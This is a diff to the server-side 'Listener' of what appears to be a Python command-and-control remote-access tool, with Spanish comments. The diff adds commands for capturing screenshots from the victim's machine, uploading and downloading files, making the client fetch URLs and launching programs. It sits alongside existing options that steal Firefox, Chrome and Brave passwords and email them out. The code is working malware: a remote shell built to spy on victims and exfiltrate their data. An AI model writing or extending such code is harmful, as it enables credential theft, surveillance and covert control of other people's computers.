@@ -5,6 +5,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 import struct
+import base64
 
 
 def signal_handler(sig, frame):
@@ -26,6 +27,8 @@ class Listener:
         '''    
         self.ip = ip
         self.port = port
+        
+        self.count_screenshot = 0
         
         # Crea un socket de tipo TCP/IP
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -207,6 +210,30 @@ class Listener:
 
         print("Screenshot received successfully!")        
         self.send_email("Screenshot", output_command, sender, recipients, password)
+        
+    def take_screenshot(self):
+        '''
+        Función para tomar una captura de pantalla
+        '''
+        comando = f"screenshot2"
+        self.client_socket.send(comando.encode())
+        
+        # Recibe primero el tamaño del archivo
+        file_size_data = self.client_socket.recv(4)
+        file_size = struct.unpack("!I", file_size_data)[0]
+        
+        # Recibe el archivo de captura de pantalla
+        with open(f"capture{self.count_screenshot}.png", "wb") as f:
+            bytes_received = 0
+            while bytes_received < file_size:
+                chunk = self.client_socket.recv(min(file_size - bytes_received, 16384))
+                if not chunk:
+                    break
+                f.write(chunk)
+                bytes_received += len(chunk)	
+            print(f"Screenshot {self.count_screenshot} received successfully!")
+        self.count_screenshot += 1
+
 
     
     def show_options(self):
@@ -218,12 +245,64 @@ class Listener:
             "get firefox": "Get the firefox passwords and send it by email",
             "get chrome": "Get the chrome passwords and send it by email",
             "get brave": "Get the brave passwords and send it by email",
+            "screenshot": "Take a screenshot and send it by email",
+            "screen2": "Take a screenshot and save it in the server",
+            "upload [file]": "Upload a file to the client",
+            "download [file]": "Download a file from the client",
+            "cd [directory]": "Change the current directory",
+            "exit": "Exit the listener",
             "help": "Show this help message"
         }    
         print("\n\nOptions:\n")
         # Muestra las opciones iterando sobre el diccionario
         for option, description in options.items():
             print(f"   {option}:\t{description}")
+            
+    def get_file(self, file):
+        '''
+        Función para descargar un archivo del cliente
+        '''
+        
+        with open(file, "wb") as file_download:
+            file_data = self.client_socket.recv(30000)
+            file_download.write(base64.b64decode(file_data))
+        
+        print(f"File {file} downloaded successfully!")
+        
+      
+           
+        
+    def upload_file(self, file):
+        '''
+        Función para subir un archivo al cliente
+        '''
+        try:
+            command = f"upload {file}"
+            self.client_socket.send(command.encode())
+            with open(file, "rb") as file_upload:
+                self.client_socket.send(base64.b64encode(file_upload.read()))
+            print(f"File {file} uploaded successfully!")
+        except Exception as e:
+            print(f"Error uploading file: {e}")
+        
+        
+    def download_file(self, file):
+        '''
+        Función para descargar un archivo del cliente
+        '''
+        try:
+            command = f"download {file}"
+            self.client_socket.send(command.encode())
+            with open(file, "wb") as file_download:
+                file_data = self.client_socket.recv(30000)
+                file_download.write(base64.b64decode(file_data))
+            print(f"File {file} downloaded successfully!")
+        except Exception as e:
+            print(f"Error downloading file: {e}")
+    
+    
+   
+
     
     def run(self):
         '''
@@ -233,7 +312,6 @@ class Listener:
         current_dir = self.client_socket.recv(1024).decode()    
 
         while True:
-            
             # Recibe la ruta donde esta el cliente
             command = input(f"{current_dir} #c2> ")
             
@@ -241,11 +319,34 @@ class Listener:
             if command.startswith("cd "):
                 self.client_socket.send(command.encode())
                 current_dir = self.client_socket.recv(1024).decode()
-                print(current_dir)
+                
             elif command=="":
                 pass
-              
-            # Si el comando es "get users" se ejecuta la función get_users
+            elif command.startswith("geturl "):
+                # Invoca la función download_internet_file para descargar el archivo de internet
+                # A partir de la posición 7 del comando que es donde empieza la URL
+                self.client_socket.send(command.encode())
+            
+            elif command.startswith("download "):
+                # Invoca la función download_file para descargar el archivo 
+                # A partir de la posición 9 del comando que es donde empieza el nombre del archivo
+                self.download_file(command[9:])
+
+            elif command.startswith("upload "):
+                # Invoca la función upload_file para subir el archivo
+                # A partir de la posición 7 del comando que es donde empieza el nombre del archivo
+                self.upload_file(command[7:])
+            
+            elif command == "screenshot2":
+                # Invoca la función take_screenshot para tomar una captura de pantalla
+                self.take_screenshot()
+
+            elif command == "start":
+                # Usa start para iniciar una aplicación en el cliente
+                # Y el servidor no se quede esperando a que termine la aplicación
+                self.client_socket.send(command.encode())    
+            
+ 
             elif command == "get users":
                 self.get_users()
             # Si el comando es "get firefox" se ejecuta la función get_firefox
@@ -266,7 +367,6 @@ class Listener:
                 print("[!] Bye, ciao, adios")
                 self.client_socket.close()
                 break
-            
             else:
                 # Ejecuta el comando y recibe la salida
                 command_output = self.run_command(command)
@@ -285,3 +385,4 @@ if __name__ == "__main__":
     
     listener = Listener(ip_server, port)
     listener.run()
+    
